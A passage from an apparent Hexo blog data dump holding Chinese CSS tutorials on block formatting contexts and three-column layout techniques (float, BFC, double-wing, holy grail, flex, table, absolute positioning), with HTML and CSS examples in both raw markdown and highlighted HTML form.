bug，我们可以理解为一种规范，<strong>如果想要避免外边距的重叠，可以将其放在不同的 BFC 容器中。</strong></p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"container\"</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">p</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">p</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">p</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">p</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-class\">.container</span> &#123;</span><br><span class=\"line\">    <span class=\"attribute\">overflow</span>: hidden;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"selector-tag\">p</span> &#123;</span><br><span class=\"line\">    <span class=\"attribute\">width</span>: <span class=\"number\">100px</span>;</span><br><span class=\"line\">    <span class=\"attribute\">height</span>: <span class=\"number\">100px</span>;</span><br><span class=\"line\">    <span class=\"attribute\">background</span>: lightblue;</span><br><span class=\"line\">    <span class=\"attribute\">margin</span>: <span class=\"number\">100px</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>这时候，两个盒子边距就变成了 200px </p>\n<p><img src=\"/assets/2016-03-17-css-bfc/2.png\" alt=\"\"></p>\n<h3 id=\"2-BFC-可以包含浮动的元素（清除浮动）\"><a href=\"#2-BFC-可以包含浮动的元素（清除浮动）\" class=\"headerlink\" title=\"2. BFC 可以包含浮动的元素（清除浮动）\"></a>2. BFC 可以包含浮动的元素（清除浮动）</h3><p>我们都知道，浮动的元素会脱离普通文档流，来看下下面一个例子</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">style</span>=<span class=\"string\">\"border: 1px solid #000;\"</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">style</span>=<span class=\"string\">\"width: 100px;height: 100px;background: #eee;float: left;\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"/assets/2016-03-17-css-bfc/3.png\" alt=\"\"></p>\n<p><strong>由于容器内元素浮动，脱离了文档流，所以容器只剩下 2px 的边距高度。如果使触发容器的 BFC，那么容器将会包裹着浮动元素。</strong></p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">style</span>=<span class=\"string\">\"border: 1px solid #000;overflow: hidden\"</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">style</span>=<span class=\"string\">\"width: 100px;height: 100px;background: #eee;float: left;\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>效果：</p>\n<p><img src=\"/assets/2016-03-17-css-bfc/4.png\" alt=\"\"></p>\n<h3 id=\"3-BFC-可以阻止元素被浮动元素覆盖\"><a href=\"#3-BFC-可以阻止元素被浮动元素覆盖\" class=\"headerlink\" title=\"3. BFC 可以阻止元素被浮动元素覆盖\"></a>3. BFC 可以阻止元素被浮动元素覆盖</h3><p>先来看一个文字环绕效果：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">style</span>=<span class=\"string\">\"height: 100px;width: 100px;float: left;background: lightblue\"</span>&gt;</span>我是一个左浮动的元素<span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">style</span>=<span class=\"string\">\"width: 200px; height: 200px;background: #eee\"</span>&gt;</span>我是一个没有设置浮动, </span><br><span class=\"line\">也没有触发 BFC 元素, width: 200px; height:200px; background: #eee;<span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>效果：</p>\n<p><img src=\"/assets/2016-03-17-css-bfc/5.png\" alt=\"\"></p>\n<p>这时候其实第二个元素有部分被浮动元素所覆盖，(但是文本信息不会被浮动元素所覆盖) 如果想避免元素被覆盖，可触第二个元素的 BFC 特性，在第二个元素中加入 <figure class=\"highlight plain\"><figcaption><span>hidden;```，就会变成：</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">![](/assets/2016-03-17-css-bfc/6.png)</span><br><span class=\"line\"></span><br><span class=\"line\">**这个方法可以用来实现两列自适应布局，效果不错，推荐写法：**</span><br><span class=\"line\"></span><br><span class=\"line\">```css</span><br><span class=\"line\">.cell&#123;</span><br><span class=\"line\">\tdisplay: table-cell;   //IE 8+ BFC 特性</span><br><span class=\"line\">\twidth: 2000px;</span><br><span class=\"line\">\t*display: inline-block;  //css hack IE 7- 伪 BFC 特性</span><br><span class=\"line\">\t*width: auto;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>注: 不用 overflow：hidden 是因为其副作用明显，无法广泛应用</p>\n<p>参考链接:</p>\n<ul>\n<li><a href=\"http://www.zhangxinxu.com/wordpress/2015/02/css-deep-understand-flow-bfc-column-two-auto-layout/\">CSS深入理解流体特性和BFC特性下多栏自适应布局</a></li>\n<li><a href=\"http://kayosite.com/block-formatting-contexts-in-detail.html\">详说 Block Formatting Contexts (块级格式化上下文)</a></li>\n</ul>\n"},{"layout":"post","title":"CSS - 浅谈页面布局","date":"2016-03-21T04:00:00.000Z","author":"Lindz","header-img":"img/16.jpg","_content":"\n## 三列布局：左右列定宽，中间自适应\n\n### 方法一：使用流体布局实现 (基本常见)\n\nhtml 代码：\n\n```html\n<div class=\"left\"></div>\n<div class=\"right\"></div>\n<div class=\"main\"></div>\n```\n\ncss 代码：\n\n```css\n.left{\n    float: left;\n    height: 200px;\n    width: 100px;\n    background: red;\n}\n.right{\n    width: 200px;\n    height: 200px;\n    background: blue;\n    float: right;\n}\n.main{\n    margin-left: 120px;\n    margin-right: 220px;\n    height: 200px;\n    background: green;\n}\n```\n\n兼容性良好  兼容 IE 6+  \n缺点：主要内容模块无法最先加载，当页面中内容较多时会影响用户体验。因此为了解决这个问题，有了如下的布局方案双飞翼布局\n\n\n### 方法二：使用 BFC 原理实现\n\nBFC 的规则之一，就是 BFC 区域，不会与 float box 重叠，因此我们可以利用这一点来实现3列布局。\n\nhtml 代码：\n\n```html\n<div class=\"left\"></div>\n<div class=\"right\"></div>\n<div class=\"center\"></div>\n```\n\ncss 代码：\n\n```css\n.left{\n    width: 100px;\n    height: 200px;\n    background: red;\n    margin-right: 20px;\n    float: left;\n}\n.right{\n    width: 200px;\n    height: 200px;\n    background: blue;\n    margin-left: 10px;\n    float: right;\n}\n.center{\n    overflow: hidden;\n    height: 200px;\n    background: green;  \n}\n```\n\n兼容性： IE6+ 都没有问题  \n缺点：主要内容模块无法最先加载，当页面中内容较多时会影响用户体验。因此为了解决这个问题，有了如下的布局方案双飞翼布局\n\n> 在IE6，IE7中使用 overflow:hidden 会没有效果，子元素超出父元素部分任然不会隐藏，解决办法就是在该元素的父级添加如下属性即可 position: relative。\n\n\n### 方法三：双飞翼布局\n\nhtml 代码：\n\n```html\n<div class=\"content\">\n    <div class=\"main\"></div>\n</div>\n<div class=\"left\"></div>\n<div class=\"right\"></div>\n```\n\ncss 代码：\n\n```css\n.content{\n    float: left;\n    width: 100%;\n}\n.main{\n    height: 100px;\n    background: green;\n    margin-left: 220px;\n    margin-right: 110px;\n}\n.main::after {       //用于清除浮动\n  \tdisplay: block;\n  \tcontent: '';\n  \tfont-size: 0;\n  \theight: 0;\n  \tclear: both;\n  \tzoom: 1;\n}\n.left{\n    float: left;\n    width: 200px;\n    height: 100px;\n    background: red;\n    margin-left: -100%;\n}\n.right{\n    float: left;\n    width: 100px;\n    height: 100px;\n    background: orange;\n    margin-left: -100px;\n}\n```\n\n优点：兼容性: IE6+ 并且主题内容优先加载\n\n缺点：html代码结构稍微复杂\n\n### 方法四：圣杯布局\n\nhtml 代码：\n\n```html\n<div class=\"container\">\n    <div class=\"main\"></div>\n    <div class=\"left\"></div>\n    <div class=\"right\"></div>\n</div>\n```\n\ncss 代码：\n\n```css\n.container{\n    margin-left: 120px;\n    margin-right: 220px;\n}\n.main{\n    height: 300px;\n    background: red;\n    float: left;\n    width: 100%;\n}\n.left{\n    float: left;\n    margin-left: -100%;\n    position: relative;\n    left: -120px;\n    height: 300px;\n    background: blue;\n    width: 100px;\n}\n.right{\n    float: left;\n    width: 200px;\n    margin-left: -200px;\n    right: -220px;\n    background: green;\n    height: 300px;\n    position: relative;\n}\n```\n\n只是和双飞翼布局上有一些细节的区别。总体来说差别不大。但 html 结构相对简单，也是可以先加载主体内容\n\n\n### 方法五：flex 布局\n\nhtml 代码：\n\n```html\n<div class=\"container\">\n    <div class=\"left\"></div>\n    <div class=\"main\"></div>\n    <div class=\"right\"></div>\n</div>\n```\n\ncss 代码：\n\n```css\n.container{\n    display: flex;\n}\n.left{\n    width: 100px;\n    height: 300px;\n    background: red;\n}\n.right{\n    width: 200px;\n    height: 300px;\n    background: blue;\n}\n.main{\n    background: green;\n    flex: 1;\n    height: 300px;\n    margin-left: 20px;\n    margin-right: 10px;\n}\n```\n\n### 方法六：table 布局\n\nhtml 代码：\n\n```html\n<div class=\"container\">\n    <div class=\"left\"></div>\n    <div class=\"main\"></div>\n    <div class=\"right\"></div>\n</div>\n```\n\ncss 代码：\n\n```css\n.container{\n    display: table;\n    width: 100%;\n}\n.left, .main, .right{\n    display: table-cell;\n}\n.left{\n    width: 200px;\n    height: 300px;\n    background: red;\n}\n.main{\n    background: green;\n}\n.right{\n    width: 100px;\n    height: 300px;\n    background: blue;\n}\n```\n\n### 方法七：绝对定位布局  \n\nhtml 代码：\n\n```html\n<div class=\"container\">\n    <div class=\"main\"></div>\n    <div class=\"left\"></div>\n    <div class=\"right\"></div>\n</div>\n```\n\ncss 代码：\n\n```css\n.container{\n    position: relative;\n}\n.left{\n    position: absolute;\n    width: 100px;\n    height: 300px;\n    background: red;\n    left: 0;\n    top:0;\n}\n.right{\n    position: absolute;\n    width: 100px;\n    height: 300px;\n    background: blue;\n    right:0;\n    top: 0;\n}\n.main{\n    height: 400px;\n    background: green;\n    margin: 0 120px;\n}\n```\n\n\n\n","source":"_posts/2016-03-20-layout-three-columns.md","raw":"---\nlayout:     post\ntitle:      \"CSS - 浅谈页面布局\"\ndate:       2016-03-21 12:00:00\nauthor:     \"Lindz\"\nheader-img: \"img/16.jpg\"\ntags:\n    - CSS\n---\n\n## 三列布局：左右列定宽，中间自适应\n\n### 方法一：使用流体布局实现 (基本常见)\n\nhtml 代码：\n\n```html\n<div class=\"left\"></div>\n<div class=\"right\"></div>\n<div class=\"main\"></div>\n```\n\ncss 代码：\n\n```css\n.left{\n    float: left;\n    height: 200px;\n    width: 100px;\n    background: red;\n}\n.right{\n    width: 200px;\n    height: 200px;\n    background: blue;\n    float: right;\n}\n.main{\n    margin-left: 120px;\n    margin-right: 220px;\n    height: 200px;\n    background: green;\n}\n```\n\n兼容性良好  兼容 IE 6+  \n缺点：主要内容模块无法最先加载，当页面中内容较多时会影响用户体验。因此为了解决这个问题，有了如下的布局方案双飞翼布局\n\n\n### 方法二：使用 BFC 原理实现\n\nBFC 的规则之一，就是 BFC 区域，不会与 float box 重叠，因此我们可以利用这一点来实现3列布局。\n\nhtml 代码：\n\n```html\n<div class=\"left\"></div>\n<div class=\"right\"></div>\n<div class=\"center\"></div>\n```\n\ncss 代码：\n\n```css\n.left{\n    width: 100px;\n    height: 200px;\n    background: red;\n    margin-right: 20px;\n    float: left;\n}\n.right{\n    width: 200px;\n    height: 200px;\n    background: blue;\n    margin-left: 10px;\n    float: right;\n}\n.center{\n    overflow: hidden;\n    height: 200px;\n    background: green;  \n}\n```\n\n兼容性： IE6+ 都没有问题  \n缺点：主要内容模块无法最先加载，当页面中内容较多时会影响用户体验。因此为了解决这个问题，有了如下的布局方案双飞翼布局\n\n> 在IE6，IE7中使用 overflow:hidden 会没有效果，子元素超出父元素部分任然不会隐藏，解决办法就是在该元素的父级添加如下属性即可 position: relative。\n\n\n### 方法三：双飞翼布局\n\nhtml 代码：\n\n```html\n<div class=\"content\">\n    <div class=\"main\"></div>\n</div>\n<div class=\"left\"></div>\n<div class=\"right\"></div>\n```\n\ncss 代码：\n\n```css\n.content{\n    float: left;\n    width: 100%;\n}\n.main{\n    height: 100px;\n    background: green;\n    margin-left: 220px;\n    margin-right: 110px;\n}\n.main::after {       //用于清除浮动\n  \tdisplay: block;\n  \tcontent: '';\n  \tfont-size: 0;\n  \theight: 0;\n  \tclear: both;\n  \tzoom: 1;\n}\n.left{\n    float: left;\n    width: 200px;\n    height: 100px;\n    background: red;\n    margin-left: -100%;\n}\n.right{\n    float: left;\n    width: 100px;\n    height: 100px;\n    background: orange;\n    margin-left: -100px;\n}\n```\n\n优点：兼容性: IE6+ 并且主题内容优先加载\n\n缺点：html代码结构稍微复杂\n\n### 方法四：圣杯布局\n\nhtml 代码：\n\n```html\n<div class=\"container\">\n    <div class=\"main\"></div>\n    <div class=\"left\"></div>\n    <div class=\"right\"></div>\n</div>\n```\n\ncss 代码：\n\n```css\n.container{\n    margin-left: 120px;\n    margin-right: 220px;\n}\n.main{\n    height: 300px;\n    background: red;\n    float: left;\n    width: 100%;\n}\n.left{\n    float: left;\n    margin-left: -100%;\n    position: relative;\n    left: -120px;\n    height: 300px;\n    background: blue;\n    width: 100px;\n}\n.right{\n    float: left;\n    width: 200px;\n    margin-left: -200px;\n    right: -220px;\n    background: green;\n    height: 300px;\n    position: relative;\n}\n```\n\n只是和双飞翼布局上有一些细节的区别。总体来说差别不大。但 html 结构相对简单，也是可以先加载主体内容\n\n\n### 方法五：flex 布局\n\nhtml 代码：\n\n```html\n<div class=\"container\">\n    <div class=\"left\"></div>\n    <div class=\"main\"></div>\n    <div class=\"right\"></div>\n</div>\n```\n\ncss 代码：\n\n```css\n.container{\n    display: flex;\n}\n.left{\n    width: 100px;\n    height: 300px;\n    background: red;\n}\n.right{\n    width: 200px;\n    height: 300px;\n    background: blue;\n}\n.main{\n    background: green;\n    flex: 1;\n    height: 300px;\n    margin-left: 20px;\n    margin-right: 10px;\n}\n```\n\n### 方法六：table 布局\n\nhtml 代码：\n\n```html\n<div class=\"container\">\n    <div class=\"left\"></div>\n    <div class=\"main\"></div>\n    <div class=\"right\"></div>\n</div>\n```\n\ncss 代码：\n\n```css\n.container{\n    display: table;\n    width: 100%;\n}\n.left, .main, .right{\n    display: table-cell;\n}\n.left{\n    width: 200px;\n    height: 300px;\n    background: red;\n}\n.main{\n    background: green;\n}\n.right{\n    width: 100px;\n    height: 300px;\n    background: blue;\n}\n```\n\n### 方法七：绝对定位布局  \n\nhtml 代码：\n\n```html\n<div class=\"container\">\n    <div class=\"main\"></div>\n    <div class=\"left\"></div>\n    <div class=\"right\"></div>\n</div>\n```\n\ncss 代码：\n\n```css\n.container{\n    position: relative;\n}\n.left{\n    position: absolute;\n    width: 100px;\n    height: 300px;\n    background: red;\n    left: 0;\n    top:0;\n}\n.right{\n    position: absolute;\n    width: 100px;\n    height: 300px;\n    background: blue;\n    right:0;\n    top: 0;\n}\n.main{\n    height: 400px;\n    background: green;\n    margin: 0 120px;\n}\n```\n\n\n\n","slug":"2016-03-20-layout-three-columns","published":1,"updated":"2016-03-21T10:38:02.000Z","comments":1,"photos":[],"link":"","_id":"cim4u6ryj000vxmvdon2aur3b","content":"<h2 id=\"三列布局：左右列定宽，中间自适应\"><a href=\"#三列布局：左右列定宽，中间自适应\" class=\"headerlink\" title=\"三列布局：左右列定宽，中间自适应\"></a>三列布局：左右列定宽，中间自适应</h2><h3 id=\"方法一：使用流体布局实现-基本常见\"><a href=\"#方法一：使用流体布局实现-基本常见\" class=\"headerlink\" title=\"方法一：使用流体布局实现 (基本常见)\"></a>方法一：使用流体布局实现 (基本常见)</h3><p>html 代码：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"left\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"right\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"main\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>css 代码：</p>\n<figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-class\">.left</span>&#123;</span><br><span class=\"line\">    <span class=\"attribute\">float</span>: left;</span><br><span class=\"line\">    <span class=\"attribute\">height</span>: <span class=\"number\">200px</span>;</span><br><span class=\"line\">    <span class=\"attribute\">width</span>: <span class=\"number\">100px</span>;</span><br><span class=\"line\">    <span class=\"attribute\">background</span>: red;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"selector-class\">.right</span>&#123;</span><br><span class=\"line\">    <span class=\"attribute\">width</span>: <span class=\"number\">200px</span>;</span><br><span class=\"line\">    <span class=\"attribute\">height</span>: <span class=\"number\">200px</span>;</span><br><span class=\"line\">    <span class=\"attribute\">background</span>: blue;</span><br><span class=\"line\">    <span class=\"attribute\">float</span>: right;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"selector-class\">.main</span>&#123;</span><br><span class=\"line\">    <span class=\"attribute\">margin-left</span>: <span class=\"number\">120px</span>;</span><br><span class=\"line\">    <span class=\"attribute\">margin-right</span>: <span class=\"number\">220px</span>;</span><br><span class=\"line\">    <span class=\"attribute\">height</span>: <span class=\"number\">200px</span>;</span><br><span class=\"line\">    <span class=\"attribute\">background</span>: green;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>兼容性良好  兼容 IE 6+<br>缺点：主要内容模块无法最先加载，当页面中内容较多时会影响用户体验。因此为了解决这个问题，有了如下的布局方案双飞翼布局</p>\n<h3 id=\"方法二：使用-BFC-原理实现\"><a href=\"#方法二：使用-BFC-原理实现\" class=\"headerlink\" title=\"方法二：使用 BFC 原理实现\"></a>方法二：使用 BFC 原理实现</h3><p>BFC 的规则之一，就是 BFC 区域，不会与 float box 重叠，因此我们可以利用这一点来实现3列布局。</p>\n<p>html 代码：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"left\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"right\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"center\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>css 代码：</p>\n<figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-class\">.left</span>&#123;</span><br><span class=\"line\">    <span class=\"attribute\">width</span>: <span class=\"number\">100px</span>;</span><br><span class=\"line\">    <span class=\"attribute\">height</span>: <span class=\"number\">200px</span>;</span><br><span class=\"line\">    <span class=\"attribute\">background</span>: red;</span><br><span class=\"line\">    <span class=\"attribute\">margin-right</span>: <span class=\"number\">20px</span>;</span><br><span class=\"line\">    <span class=\"attribute\">float</span>: left;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"selector-class\">.right</span>&#123;</span><br><span class=\"line\">    <span class=\"attribute\">width</span>: <span class=\"number\">200px</span>;</span><br><span class=\"line\">    <span class=\"attribute\">height</span>: <span class=\"number\">200px</span>;</span><br><span class=\"line\">    <span class=\"attribute\">background</span>: blue;</span><br><span class=\"line\">    <span class=\"attribute\">margin-left</span>: <span class=\"number\">10px</span>;</span><br><span class=\"line\">    <span class=\"attribute\">float</span>: right;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"selector-class\">.center</span>&#123;</span><br><span class=\"line\">    <span class=\"attribute\">overflow</span>: hidden;</span><br><span class=\"line\">    <span class=\"attribute\">height</span>: <span class=\"number\">200px</span>;</span><br><span class=\"line\">    <span class=\"attribute\">background</span>: green;  </span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>兼容性： IE6+ 都没有问题<br>缺点：主要内容模块无法最先加载，当页面中内容较多时会影响用户体验。因此为了解决这个问题，有了如下的布局方案双飞翼布局</p>\n<blockquote>\n<p>在IE6，IE7中使用 overflow:hidden 会没有效果，子元素超出父元素部分任然不会隐藏，解决办法就是在该元素的父级添加如下属性即可 position: relative。</p>\n</blockquote>\n<h3 id=\"方法三：双飞翼布局\"><a href=\"#方法三：双飞翼布局\" class=\"headerlink\" title=\"方法三：双飞翼布局\"></a>方法三：双飞翼布局</h3><p>html 代码：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"content\"</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"main\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"left\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"right\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>css 代码：</p>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.content&#123;</span><br><span class=\"line\">    float: left;</span><br><span class=\"line\">    width: 100%;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">.main&#123;</span><br><span class=\"line\">    height: 100px;</span><br><span class=\"line\">    background: green;</span><br><span class=\"line\">    margin-left: 220px;</span><br><span class=\"line\">    margin-right: 110px;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">.main::after &#123;       //用于清除浮动</span><br><span class=\"line\">  \tdisplay: block;</span><br><span class=\"line\">  \tcontent: '';</span><br><span class=\"line\">  \tfont-size: 0;</span><br><span class=\"line\">  \theight: 0;</span><br><span class=\"line\">  \tclear: both;</span><br><span class=\"line\">  \tzoom: 1;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">.left&#123;</span><br><span class=\"line\">    float: left;</span><br><span class=\"line\">    width: 200px;</span><br><span class=\"line\">    height: 100px;</span><br><span class=\"line\">    background: red;</span><br><span class=\"line\">    margin-left: -100%;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">.right&#123;</span><br><span class=\"line\">    float: left;</span><br><span class=\"line\">    width: 100px;</span><br><span class=\"line\">    height: 100px;</span><br><span class=\"line\">    background: orange;</span><br><span class=\"line\">    margin-left: -100px;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>优点：兼容性: IE6+ 并且主题内容优先加载</p>\n<p>缺点：html代码结构稍微复杂</p>\n<h3 id=\"方法四：圣杯布局\"><a href=\"#方法四：圣杯布局\" class=\"headerlink\" title=\"方法四：圣杯布局\"></a>方法四：圣杯布局</h3><p>html 代码：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"container\"</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"main\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"left\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"right\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>css 代码：</p>\n<figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span 